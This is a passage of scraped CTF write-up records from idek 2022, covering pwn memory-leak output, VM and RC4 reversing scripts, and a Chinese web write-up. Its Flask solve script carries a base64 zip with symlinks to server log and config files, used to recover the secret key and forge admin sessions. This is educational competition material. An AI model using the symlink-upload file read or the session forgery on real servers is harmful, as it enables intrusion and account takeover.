4096\nb'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'\nSelect Option:\n1. Connect\n2. Change Receive Buffer\n3. Change Send Buffer\n4. Send data\n5. Receive data\n> 5\nSize> 4096\nb'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'\nSelect Option:\n1. Connect\n2. Change Receive Buffer\n3. Change Send Buffer\n4. Send data\n5. Receive data\n> 5\nSize> 4096\nb'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\n\\x0b\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\xfcz\\xce\\x94U\\x00\\x00@0\\xb0\\x171\\x7f\\x00\\x00\\xd3to\\x171\\x7f\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00.\\x84\\xa2\\xdaT8{\\x00\\x00\\x00\\x00aaaa`\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x0b\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\xfcz\\xce\\x94U\\x00\\x00@0\\xb0\\x171\\x7f\\x00\\x00\\xd3to\\x171\\x7f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xed\\xdfm\\x171\\x7f\\x00\\x00@gV\\x171\\x7f\\x00\\x00\\x00\\x86\\x86\\x171\\x7f\\x00\\x00@\\xd2\\xd4\\xcf\\x94U\\x00\\x00\\xa7\\rm\\x171\\x7f\\x00\\x00@\\x03\\x7f\\xf5\\xfe\\x7f\\x00\\x00`\\x00\\x7f\\xf5\\xfe\\x7f\\x00\\x000\\xd2\\xd4\\xcf\\x94U\\x00\\x00;fz\\xce\\x94U\\x00\\x00aaaaaaaa@\\xd2\\xd4\\xcf\\x94U\\x00\\x00idek{exploiting_coroutines}\\x00aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\x00.\\x84\\xa2\\xdaT8{ \\xd4\\xd4\\xcf\\x94U\\x00\\x00p\\xff~\\xf5\\xfe\\x7f\\x00\\x00P\\xff~\\xf5\\xfe\\x7f\\x00\\x00\\x1a\\x9cz\\xce\\x94U\\x00\\x00\\x00\\xd5\\xd4\\xcf\\x94U\\x00\\x00\\x8c\\xff~\\xf5\\xfe\\x7f\\x00\\x00p\\xff~\\xf5\\xfe\\x7f\\x00\\x00F\\xa2z\\xce\\x94U\\x00\\x00\\x00\\xd5\\xd4\\xcf\\x94U\\x00\\x00\\x8c\\xff~\\xf5\\xfe\\x7f\\x00\\x00\\x90\\xff~\\xf5\\xfe\\x7f\\x00\\x00X\\x03\\x7f\\xf5\\xfe\\x7f\\x00\\x00\\xa8\\xff~\\xf5\\xfe\\x7f\\x00\\x00\\xb0\\xff~\\xf5\\xfe\\x7f\\x00\\x00\\xc0\\xff~\\xf5\\xfe\\x7f\\x00\\x00\\xf0\\xff~\\xf5\\xfe\\x7f\\x00\\x00\\xc0\\xff~\\xf5\\xfe\\x7f\\x00\\x00\\xb8\\xd4\\xd4\\xcf\\x94U\\x00\\x00\\xc0\\xff~\\xf5\\xfe\\x7f\\x00\\x00$\\x8ez\\xce\\x94U\\x00\\x00\\x00\\xd5\\xd4\\xcf\\x94U\\x00\\x00\\xb0\\xd4\\xd4\\xcf\\x94U\\x00\\x00\\x00\\x00\\x7f\\xf5\\xfe\\x7f\\x00\\x00n\\x8dz\\xce\\x94U\\x00\\x00'\nSelect Option:\n1. Connect\n2. Change Receive Buffer\n3. Change Send Buffer\n4. Send data\n5. Receive data\n> 5\nSize> 4096\nb'\\x00\\xd5\\xd4\\xcf\\x94U\\x00\\x00\\x98\\xd4\\xd4\\xcf\\x94U\\x00\\x00\\x00'\nSelect Option:\n1. Connect\n2. Change Receive Buffer\n3. Change Send Buffer\n4. Send data\n5. Receive data\n> \n\nfrom capstone import *\nimport os, re\n\ncs = Cs(CS_ARCH_X86, CS_MODE_64)\ncs.syntax = CS_OPT_SYNTAX_ATT\n\nlines = open('vm.txt').read().splitlines() # vm.txt content from IDA assembly window\narr: list[list[int]] = []\ncurrent: list[int] = None\nfor line in lines:\n    if line.startswith('qword'):\n        if current is not None:\n            arr.append(current)\n        current = []\n    line = line[line.find('dq ')+3:]\n    if line.endswith('h'): line = line[:-1]\n    line = int(line, 16)\n    current.append(line)\narr.append(current)\n\nstubs = bytes.fromhex('4839D6C3480F4CD9C383F8FFC30FB775E4C34883E204C34889F3C366890477C34883E202C3488984F708000200C34883C801C348C7C000000000C34883C804C36629D8C34883CE08C34883C802C359C30FB71C57C30FB755E8C348C7C600000000C3488B9CD708000200C34883E201C34889DEC34881E6F7FF0000C383FA00C35BC34883C410C3C30FB78700000200C30FB73477C30FB73457C3C9C366F7F3C3488B7DE8C3480F4FD9C36689B702000200C3FFE3C34889C7C30FB7B702000200C366F7E3C34883E208C366898700000200C36689D0C36601D8C30FB70477C36689C6C30FB79702000200C3480F44D9C3488B84F708000200C30FB7845F08001000C30FB78702000200C36689B47708001000C34889C6C34889DAC3')\n\nret = False\nimap = {}\nfor addr, _, op, opr in cs.disasm_lite(stubs, 0):\n    if ret:\n        assert op == 'retq'\n        ret = False\n    else:\n        if op == 'retq':\n            op = 'nop'\n        elif opr != '':\n            op += ' ' + opr\n        imap[addr] = op\n        if op != 'nop':\n            ret = True\n\nfor ops in arr:\n    for i, op in enumerate(ops):\n        if op >= 0x100000:\n            ops[i] = 'call %s' % ('tmpfile', 'fclose', 'getc', 'ungetc', 'putc', 'exit')[op - 0x100000]\n        else:\n            ops[i] = imap[op]\n\nclass InstrState:\n    def __init__(self, prefix):\n        self._list = []\n        self._state = 0 # 0正常 1rbx 2rcx 其他为cmov\n        self._branch = [None, None]\n        self._prefix = prefix\n        self._i = 0\n\n    def push(self, instr: str):\n        if instr == 'addq $0x10, %rsp':\n            return\n        elif instr == 'leave':\n            instr = 'retq'\n        elif instr == 'movq -0x18(%rbp), %rdi':\n            instr = 'movq vm(%rip), %rdi'\n        elif instr == 'movzwl -0x1c(%rbp), %esi':\n            instr = 'movzwl opr1(%rip), %esi'\n\n        match = re.fullmatch('cmov(.*)q %rcx, %rbx', instr)\n        if instr == 'popq %rbx':\n            self._state = 1\n        elif instr == 'popq %rcx':\n            self._state = 2\n        elif match:\n            self._state = match.group(1)\n        else:\n            if self._state == 0:\n                self._list.append(instr)\n            elif self._state == 1:\n                self._branch[0] = instr\n                self._state = 0\n            elif self._state == 2:\n                self._branch[1] = instr\n                self._state = 0\n            else:\n                if instr == 'jmpq *%rbx':\n                    l1 = '.%s%d' % (self._prefix, self._i)\n                    l2 = '.%s%d' % (self._prefix, self._i + 1)\n                    self._i += 2\n                    self._list.extend((\n                        'j%s %s' % (self._state, l1),\n                        self._branch[0],\n                        'jmp %s' % l2,\n                        '%s:' % l1,\n                        self._branch[1],\n                        '%s:' % l2,\n                    ))\n                    self._state = 0\n                else:\n                    self._list.append(instr)\n\n    def get(self):\n        return self._list + ['retq']\n\nfor i, ops in enumerate(arr):\n    state = InstrState('L%02d' % i)\n    for op in ops[:-1]:\n        state.push(op)\n    arr[i] = state.get()\n\n#import json\n#arr = dict(('op_%02d' % i, c) for i, c in enumerate(arr))\n#json.dump(arr, open('dump.json', 'w'), indent=2)\n#exit()\n\ndummy = ''\nfor i, code in enumerate(arr):\n    dummy += '''\\\nstatic void op_%02d(struct vm *vm, uint16_t opr1, uint16_t opr2) __attribute__((naked));\nvoid op_%02d(struct vm *vm, uint16_t opr1, uint16_t opr2) {\n    __asm__(\n%s\n    );\n}\n\n''' % (i, i, ''.join('        \"%s\\\\n\"\\n' % c for c in code))\n\ndummy = open('template.c').read().replace('// dummy', dummy)\nopen('dummy.c', 'w').write(dummy)\nassert os.system('gcc -g -o dummy dummy.c') == 0\nos.unlink('dummy.c')\n\nfor i, c in enumerate(ipt):\n    ipt[i] = c * 7 + ipt[i - 1] & 255\n\n\nx=bytearray(b'1'*50)\ny=[56,249,57,189,100,114,19,194,150,229,15,95,157,173,224,220,36,35,119,69,248,43,148,216,239,247,68,177,198,81,224,231,4,241,74,224,237,179,196,51,192,136,96,28,120,29,208,186,59,179]\n\nfor i in range(len(x)):\n    for i, c in enumerate(x):\n        c = c * 7 + x[i - 1]\n        x[i] = c & 255\nassert list(x) == [131,249,88,252,65,234,135,143,175,188,75,191,35,85,222,232,91,218,223,67,11,222,18,97,165,32,232,220,121,44,49,77,183,58,216,51,6,71,14,109,254,4,43,237,39,154,134,59,76,243]\n\nfrom Crypto.Util.number import inverse\ni7 = inverse(7, 256)\nfor i in range(len(y)):\n    for i, c in enumerate(reversed(y)):\n        i = len(y) - i - 1\n        c = (c - y[i - 1]) * i7\n        y[i] = c & 255\nprint(bytes(y).decode())\n\n    std::byte buffer2[513];\n    // buffer 堆地址\n    printf(\"SendAllAsyncNewline buffer: %p\\n\", buffer.data());\n    // buffer2 栈地址，这块地址会跟存放 flag 的栈地址重叠\n    printf(\"SendAllAsyncNewline buffer2: %p\\n\", buffer2);\n    std::copy(buffer.begin(), buffer.end(), buffer2);\n    buffer2[buffer.size()] = (std::byte)'\\n';\n\n\n    // 这里的 buffer 是栈地址\n    printf(\"SendAllAsync origin buffer: %p\\n\", buffer.data());\n    int offset = 0;\n    // 如果没有完全写入，则会重新写\n    while (offset < buffer.size())\n    {\n        printf(\"SendAllAsync before SendAsync buffer: %p\\n\", buffer.data() + offset);\n        int result = co_await SendAsync(ctx, socket, std::span(buffer.data() + offset, buffer.size() - offset));\n        printf(\"SendAsync result: %d(%x)\", result, result);\n        if (result == -1)\n        {\n            co_return false;\n        }\n\n\n    printf(\"[%02x]: 0x%lx\\n\", i * 8, a[i]);\n\n\n    # print(\">>> Tracing instruction at 0x%x, instruction size = 0x%x\" % (address, size))\n    for i in cs.disasm(uc.mem_read(address, size), address):\n        print(\"0x%x:\\t%s\\t%s\" % (i.address, i.mnemonic, i.op_str))\n        if i.mnemonic == 'svc':\n            call = uc.reg_read(UC_ARM64_REG_X8)\n            print(f\">>> syscall num: {call}\")\n            if call == 64:\n                print(f\">>> {uc.mem_read(uc.reg_read(UC_ARM64_REG_X1), uc.reg_read(UC_ARM64_REG_X2))}\")\n\n\n    # print(\">>> Tracing instruction at 0x%x, instruction size = 0x%x\" % (address, size))\n    for i in cs.disasm(uc.mem_read(address, size), address):\n        print(\"0x%x:\\t%s\\t%s\" % (i.address, i.mnemonic, i.op_str))\n        if i.mnemonic == 'syscall':\n            call = uc.reg_read(UC_X86_REG_RAX)\n            print(f\">>> syscall num: {call}\")\n            if call == 1:\n                print(f\">>> arg1 = {uc.reg_read(UC_X86_REG_RDI)}, arg2 = {uc.mem_read(uc.reg_read(UC_X86_REG_RSI), uc.reg_read(UC_X86_REG_RDX))}\")\n\n\n    def __init__(self, prefix):\n        self._list = []\n        self._state = 0 # 0正常 1rbx 2rcx 其他为cmov\n        self._branch = [None, None]\n        self._prefix = prefix\n        self._i = 0\n\n\n    def push(self, instr: str):\n        if instr == 'addq $0x10, %rsp':\n            return\n        elif instr == 'leave':\n            instr = 'retq'\n        elif instr == 'movq -0x18(%rbp), %rdi':\n            instr = 'movq vm(%rip), %rdi'\n        elif instr == 'movzwl -0x1c(%rbp), %esi':\n            instr = 'movzwl opr1(%rip), %esi'\n\n\n    def get(self):\n        return self._list + ['retq']\n\n\n    // from file prog\n\n\n    // from file mem\n\n\n    // from file mem\n\n\n    FILE *f0, *f1, *f2, *f3;\n    uint16_t r4, r5, r6, r7;\n    printf(\"Initializing Interpreter...\\n\");\n    printf(\"read(0, buf, 50);\\n\");\n    printf(\"Flag?\\n\");\n    f0 = tmpfile();\n    f1 = tmpfile();\n    f2 = tmpfile();\n    f3 = tmpfile();\n    for (r4 = 0; ; ++r4) {\n        r5 = mem[r4];\n        if (cmp(r5, 0)) break;\n        ungetc(r5, f1);\n        printf(\">%d\\n\", r5);\n    }\n    ungetc(0, f3);\n    L126:\n    r4 = getc(f1);\n    printf(\"<%d\\n\", r4);\n    if (r4 == 0xFFFF) {\n        // 成功分支\n        exit(0);\n    }\n    ungetc(r4, f1);\n    if (!cmp(r4, 127)) {\n        if (!cmp(r4, 159)) {\n            if (!cmp(r4, 218)) {\n                if (!cmp(r4, 37)) {\n                    if (!cmp(r4, 9)) {\n                        if (!cmp(r4, 101)) {\n                            if (!cmp(r4, 74)) {\n                                if (!cmp(r4, 66)) {\n                                    L154:\n                                    r4 = getc(f1);\n                                    ungetc(r4, f0);\n                                    goto L126;\n                                } else{\n                                    // L245\n                                    r6 = getc(stdin);\n                                    r5 = getc(f3);\n                                    ungetc(r6, f3);\n                                    goto L154;\n                                }\n                            } else {\n                                // L212\n                                r5 = getc(f3);\n                                ungetc(r5, f3);\n                                if (r5 == 0) {\n                                    // L218\n                                    r6 = 0;\n                                    L221:\n                                    r5 = getc(f1);\n                                    ungetc(r5, f1);\n                                    if (cmp(r5, 159)) {\n                                        // L234\n                                        r6 += 1;\n                                    }\n                                    // L226\n                                    if (cmp(r7, 74)) {\n                                        // L236\n                                        r6 -= 1;\n                                    }\n                                    // L229\n                                    if (cmp(r6, 0)) {\n                                        goto L154;\n                                    }\n                                    r5 = getc(f0);\n                                    ungetc(r5, f1);\n                                    goto L221;\n                                }\n                                goto L154;\n                            }\n                        } else {\n                            // L205\n                            r5 = getc(f3);\n                            r6 = 2;\n                            r5 += r6;\n                            r5 /= 256;\n                            ungetc(r5, f3);\n                            goto L154;\n                        }\n                    } else{\n                        // L194\n                        r5 = getc(f2);\n                        if (r5 == 0xFFFF) {\n                            r5 = 0;\n                        }\n                        // L196\n                        ungetc(r5, f3);\n                        r5 = getc(f2);\n                        if (r5 == 0xFFFF) {\n                            // L203\n                            r5 = 0;\n                        }\n                        // L199\n                        ungetc(r5, f3);\n                        goto L154;\n                    }\n                } else {\n                    // L189\n                    r5 = getc(f3);\n                    putc(r5, stdout);\n                    ungetc(r5, f3);\n                    goto L154;\n                }\n            } else {\n                // L238\n                r5 = getc(f3);\n                r5 -= 1;\n                r5 /= 256;\n                ungetc(r5, f3);\n                goto L154;\n            }\n        } else {\n            // L163\n            r5 = getc(f3);\n            ungetc(r5, f3);\n            if (!cmp(r5, 0)) {\n                goto L154;\n            }\n            // L169\n            r6 = 0;\n            L172:\n            r5 = getc(f1);\n            ungetc(r5, f1);\n            if (cmp(r5, 159)) {\n                // L185\n                r6 += 1;\n            }\n            // L177\n            if (cmp(r5, 74)) {\n                // L187\n                r6 -= 1;\n            }\n            // L180\n            if (cmp(r6, 0)) {\n                goto L154;\n            }\n            r5 = getc(f1);\n            ungetc(r5, f0);\n            goto L172;\n        }\n    } else {\n        // L157\n        r5 = getc(f3);\n        if (r5 == 0xFFFF) {\n            r5 = 0;\n        }\n        // L159\n        ungetc(r5, f2);\n        goto L154;\n    }\n    return 0;\n\n\n    for b in table:\n        for c in table:\n            for d in table:\n                key = bytes([a,b,c,d])\n                rc4_cryptor = ARC4.new(key)\n                m = rc4_cryptor.decrypt(enc)\n                if b'idek{' in m:\n                    print(key)\n                    print(m)\n", "tools": ["python", "pycryptodome", "burp", "ida", "gdb", "radare2"], "file_path": "temp_repos\\r3kapig_writeup\\20230119-idek2022-pwn_reverse\\README.md", "file_size": 48280, "scraped_at": "2025-10-26T18:19:26.865548"}
{"id": "r3kapig_writeup_idek_2022*_Web_&&_Crypto_Writeup", "team": "r3kapig", "repo": "writeup", "challenge_name": "idek 2022* Web && Crypto Writeup", "attack_type": "RSA", "writeup": "# idek 2022* Web && Crypto Writeup\n\n## 前言\n\n根据前面我们所整理的wp,这里最后将web&&Crypto的writeup整理完毕在此呈现,希望大家共同学习进步.本比赛的部分Web和Crypto比较困难而且有趣.之后我们会推出一些复现文章,敬请期待.\n\n![](https://imgur.com/x2Krcsf.png)\n\n也欢迎对国际比赛感兴趣的师傅,欢迎简历`root@r3kapig.com`.我们会及时回复\n\n## Web:\n\n### Readme:\n\n很简单签到题，算是个逻辑漏洞问题\n\n这个程序中只有一个路由\n\n```go\nhttp.HandleFunc(\"/just-read-it\", justReadIt)\n```\n\n首先简单看一下可以得出程序逻辑如果能成功走到justReadIt函数最下方就能获得flag\n\n```go\nfunc justReadIt(w http.ResponseWriter, r *http.Request) {\n        defer r.Body.Close()\n\n        body, err := ioutil.ReadAll(r.Body)\n        if err != nil {\n                w.WriteHeader(500)\n                w.Write([]byte(\"bad request\\n\"))\n                return\n        }\n\n        reqData := ReadOrderReq{}\n        if err := json.Unmarshal(body, &reqData); err != nil {\n                w.WriteHeader(500)\n                w.Write([]byte(\"invalid body\\n\"))\n                return\n        }\n\n        if len(reqData.Orders) > MaxOrders {\n                w.WriteHeader(500)\n                w.Write([]byte(\"whoa there, max 10 orders!\\n\"))\n                return\n        }\n\n        reader := bytes.NewReader(randomData)\n        validator := NewValidator()\n\n        ctx := context.Background()\n        for _, o := range reqData.Orders {\n                if err := validator.CheckReadOrder(o); err != nil {\n                        w.WriteHeader(500)\n                        w.Write([]byte(fmt.Sprintf(\"error: %v\\n\", err)))\n                        return\n                }\n\n                ctx = WithValidatorCtx(ctx, reader, int(o))\n                _, err := validator.Read(ctx)\n                if err != nil {\n                        w.WriteHeader(500)\n                        w.Write([]byte(fmt.Sprintf(\"failed to read: %v\\n\", err)))\n                        return\n                }\n        }\n\n        if err := validator.Validate(ctx); err != nil {\n                w.WriteHeader(500)\n                w.Write([]byte(fmt.Sprintf(\"validation failed: %v\\n\", err)))\n                return\n        }\n\n        w.WriteHeader(200)\n        w.Write([]byte(os.Getenv(\"FLAG\")))\n}\n```\n\n我们一点一点来看，首先是接受了一个传来的json数据，解析保存到reqData当中，从下面可以看出只接受一个完全由数字组成的int数组，字段名叫orders\n\n```go\ntype ReadOrderReq struct {\n        Orders []int `json:\"orders\"`\n}\n```\n\n之后会用randomData初始化一个reader\n\n```\nreader := bytes.NewReader(randomData)\n```\n\n而这个randomData则是由initRandomData函数初始化，记住这个password复制在了12625之后\n\n```go\nfunc initRandomData() {\n        rand.Seed(1337)\n        randomData = make([]byte, 24576)\n        if _, err := rand.Read(randomData); err != nil {\n                panic(err)\n        }\n        copy(randomData[12625:], password[:])\n}\n```\n\n初始化之后会遍历`reqData.Orders`\n调用`CheckReadOrder`检查oders中的int值范围是否在0-100\n\n```go\nfunc (v *Validator) CheckReadOrder(o int) error {\n        if o <= 0 || o > 100 {\n                return fmt.Errorf(\"invalid order %v\", o)\n        }\n        return nil\n}\n```\n\n之后根据数值读出指定位数的值\n\n```go\nif err := validator.Validate(ctx); err != nil {\n                w.WriteHeader(500)\n                w.Write([]byte(fmt.Sprintf(\"validation failed: %v\\n\", err)))\n                return\n        }\n\n        w.WriteHeader(200)\n        w.Write([]byte(os.Getenv(\"FLAG\")))\n```\n\n这个函数功能就是读32位，之后与password比较，成功返回true，而我们前面说过这个password复制在了12625之后，并且oders数组容量最多只能有10个数字\n\n```go\nfunc (v *Validator) Validate(ctx context.Context) error {\n        r, _ := GetValidatorCtxData(ctx)\n        buf, err := v.Read(WithValidatorCtx(ctx, r, 32))\n        if err != nil {\n                return err\n        }\n        if bytes.Compare(buf, password[:]) != 0 {\n                return errors.New(\"invalid password\")\n        }\n        return nil\n}\n```\n\n就算全取最大100，10个也才1000，距离我们的12625还差很远\n\n再往前看发现read之前\n\n```go\nfunc (v *Validator) Read(ctx context.Context) ([]byte, error) {\n        r, s := GetValidatorCtxData(ctx)\n        buf := make([]byte, s)\n        _, err := r.Read(buf)\n        if err != nil {\n                return nil, fmt.Errorf(\"read error: %v\", err)\n        }\n        return buf, nil\n}\n```\n\n有这样一个调用，如果size大于等于100会调用一个bufio.NewReader\n\n```go\nfunc GetValidatorCtxData(ctx context.Context) (io.Reader, int) {\n        reader := ctx.Value(reqValReaderKey).(io.Reader)\n        size := ctx.Value(reqValSizeKey).(int)\n        if size >= 100 {\n                reader = bufio.NewReader(reader)\n        }\n        return reader, size\n}\n```\n\n这个defaultBufSize是4096\n\n```go\n// NewReader returns a new Reader whose buffer has the default size.\nfunc NewReader(rd io.Reader) *Reader {\n        return NewReaderSize(rd, defaultBufSize)\n}\n```\n\n最终\n\n![](https://imgur.com/UMCkOg9.png)\n\n### SimpleFileServer:\n\n也是python的flask的题目\n\n可以看到获得flag的条件，那就是成为admin，所以很容易猜测到考点是session伪造，而flask里面这个session的生成通常和变量`app.config[\"SECRET_KEY\"]`息息相关\n\n```python\n@app.route(\"/flag\")\ndef flag():\n    if not session.get(\"admin\"):\n        return \"Unauthorized!\"\n    return subprocess.run(\"./flag\", shell=True, stdout=subprocess.PIPE).stdout.decode(\"utf-8\")\n```\n\n因此一切的前提是我们能获得这个`SECRET_KEY`\n\n```python\napp.config[\"SECRET_KEY\"] = os.environ[\"SECRET_KEY\"]\n```\n\n而这部分生成在config.py当中\n\n要爆破这部分很明显一是我们需要知道这个`time.time()`的", "solution_code": "@app.route(\"/flag\")\ndef flag():\n    if not session.get(\"admin\"):\n        return \"Unauthorized!\"\n    return subprocess.run(\"./flag\", shell=True, stdout=subprocess.PIPE).stdout.decode(\"utf-8\")\n\napp.config[\"SECRET_KEY\"] = os.environ[\"SECRET_KEY\"]\n\n@app.route(\"/upload\", methods=[\"GET\", \"POST\"])\ndef upload():\n    if not session.get(\"uid\"):\n        return redirect(\"/login\")\n    if request.method == \"GET\":\n        return render_template(\"upload.html\")\n\n    if \"file\" not in request.files:\n        flash(\"You didn't upload a file!\", \"danger\")\n        return render_template(\"upload.html\")\n    \n    file = request.files[\"file\"]\n    uuidpath = str(uuid.uuid4())\n    filename = f\"{DATA_DIR}uploadraw/{uuidpath}.zip\"\n    file.save(filename)\n    subprocess.call([\"unzip\", filename, \"-d\", f\"{DATA_DIR}uploads/{uuidpath}\"])    \n    flash(f'Your unique ID is <a href=\"/uploads/{uuidpath}\">{uuidpath}</a>!', \"success\")\n    logger.info(f\"User {session.get('uid')} uploaded file {uuidpath}\")\n    return redirect(\"/upload\")\n\n@app.route(\"/uploads/<path:path>\")\ndef uploads(path):\n    try:\n        return send_from_directory(DATA_DIR + \"uploads\", path)\n    except PermissionError:\n        abort(404)\n\n# Configure logging\nLOG_HANDLER = logging.FileHandler(DATA_DIR + 'server.log')\nLOG_HANDLER.setFormatter(logging.Formatter(fmt=\"[{levelname}] [{asctime}] {message}\", style='{'))\nlogger = logging.getLogger(\"application\")\nlogger.addHandler(LOG_HANDLER)\nlogger.propagate = False\nfor handler in logging.root.handlers[:]:\n    logging.root.removeHandler(handler)\nlogging.basicConfig(level=logging.WARNING, format='%(asctime)s %(levelname)s %(name)s %(threadName)s : %(message)s')\nlogging.getLogger().addHandler(logging.StreamHandler())\n\ndecoded = {'admin': True, 'uid': userinfo['username']}\n\nimport base64\n\nimport requests, re, time, datetime, random\nimport flask_unsign\n\nsess = requests.session()\nSECRET_OFFSET = -67198624 * 1000\nuserinfo = {\"username\": \"yyds\", \"password\": \"yyds\"}\nbaseurl = \"http://127.0.0.1:1337/\"\npocZip = \"UEsDBAoAAAAAACJsMVZvT1MBDwAAAA8AAAAKABwAc2VydmVyLmxvZ1VUCQADDzPGYw8zxmN1eAsAAQT1AQAABBQAAAAvdG1wL3NlcnZlci5sb2dQSwMECgAAAAAAG2wxVuPo95IOAAAADgAAAAkAHABjb25maWcucHlVVAkAAwUzxmMFM8ZjdXgLAAEE9QEAAAQUAAAAL2FwcC9jb25maWcucHlQSwECHgMKAAAAAAAibDFWb09TAQ8AAAAPAAAACgAYAAAAAAAAAAAA7aEAAAAAc2VydmVyLmxvZ1VUBQADDzPGY3V4CwABBPUBAAAEFAAAAFBLAQIeAwoAAAAAABtsMVbj6PeSDgAAAA4AAAAJABgAAAAAAAAAAADtoVMAAABjb25maWcucHlVVAUAAwUzxmN1eAsAAQT1AQAABBQAAABQSwUGAAAAAAIAAgCfAAAApAAAAAAA\"\ncookie = \"\"\nlog_url = \"\"\n\ndef register():\n    reg_url = baseurl + \"register\"\n    sess.post(reg_url, userinfo)\n\n\ndef login():\n    global cookie\n    set_cookie = sess.post(baseurl + \"login\", 